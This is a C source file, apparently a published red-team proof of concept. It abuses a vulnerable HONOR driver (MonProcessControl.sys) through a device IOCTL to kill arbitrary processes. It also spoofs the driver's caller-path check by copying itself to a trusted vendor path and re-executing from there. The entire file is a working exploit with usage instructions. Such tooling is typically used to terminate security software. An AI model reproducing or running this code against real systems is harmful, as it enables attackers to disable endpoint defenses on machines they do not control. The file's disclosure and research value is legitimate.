/*
 * MonProcessControl.sys BYOVD Process Killer POC
 * Author: Jehad Abudagga (@j3h4ck)
 * https://github.com/redteamfortress
 *
 * HONOR MagicSpaceTurbo driver arbitrary process termination via IOCTL 0x0022400C.
 * Driver enforces a path check on the calling process, so the POC copies itself to
 * C:\HONOR\MagicAnimation\MagicSpaceTurbo.exe and re-executes from there.
 *
 * RUN AS ADMIN !!!
 * Usage: monproc_poc.exe <PID>
 */

#include <windows.h>
#include <stdio.h>

#define IOCTL_KILL 0x0022400C

static BOOL IsAlreadyRelocated(void)
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return strstr(path, "MagicSpaceTurbo.exe") != NULL;
}

static int Relocate(int argc, char** argv)
{
    char src[MAX_PATH], dst[MAX_PATH], cmd[1024];
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileNameA(NULL, src, MAX_PATH);

    CreateDirectoryA("C:\\HONOR", NULL);
    CreateDirectoryA("C:\\HONOR\\MagicAnimation", NULL);
    snprintf(dst, sizeof(dst), "C:\\HONOR\\MagicAnimation\\MagicSpaceTurbo.exe");

    if (!CopyFileA(src, dst, FALSE)) {
        printf("[-] Copy failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Copied to %s\n", dst);

    snprintf(cmd, sizeof(cmd), "\"%s\"", dst);
    for (int i = 1; i < argc; i++) {
        char tmp[64];
        snprintf(tmp, sizeof(tmp), " %s", argv[i]);
        strcat(cmd, tmp);
    }

    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] Relaunch failed: %lu\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    DeleteFileA(dst);
    return (int)exitCode;
}

int main(int argc, char** argv)
{
    HANDLE hDev;
    DWORD ret, pid;

    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    pid = (DWORD)atoi(argv[1]);
    printf("[*] Target PID: %lu\n", pid);

    if (!IsAlreadyRelocated()) {
        printf("[*] Relocating to bypass path check...\n");
        return Relocate(argc, argv);
    }

    hDev = CreateFileW(L"\\\\.\\MonProcessControl",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("[-] Open failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Device opened\n");

    if (DeviceIoControl(hDev, IOCTL_KILL, &pid, 4, &pid, 4, &ret, NULL)) {
        printf("[+] Process %lu terminated\n", pid);
    } else {
        printf("[-] Kill failed: %lu\n", GetLastError());
    }

    CloseHandle(hDev);
    return 0;
}
